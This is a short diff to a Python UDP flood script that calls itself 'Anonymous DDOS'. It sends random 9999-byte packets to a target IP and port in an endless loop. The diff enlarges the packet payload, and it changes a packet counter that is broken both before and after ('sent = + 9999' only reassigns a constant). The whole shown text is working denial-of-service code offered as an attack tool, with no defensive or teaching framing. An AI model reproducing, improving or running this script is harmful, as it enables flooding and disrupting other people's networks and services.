@@ -5,7 +5,7 @@ import socket
 import random
 print("Installation Complete")
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-bytes = random._urandom(2000)
+bytes = random._urandom(9999)
 os.system("clear")
 ####
 print("Welcome To Anonymous DDOS")
@@ -23,5 +23,5 @@ print("Attacking...")
 sent = 0
 while True:
 	sock.sendto(bytes, (ip,port))
-	sent = + 1 
+	sent = + 9999
 	print("Attacked To the Target")
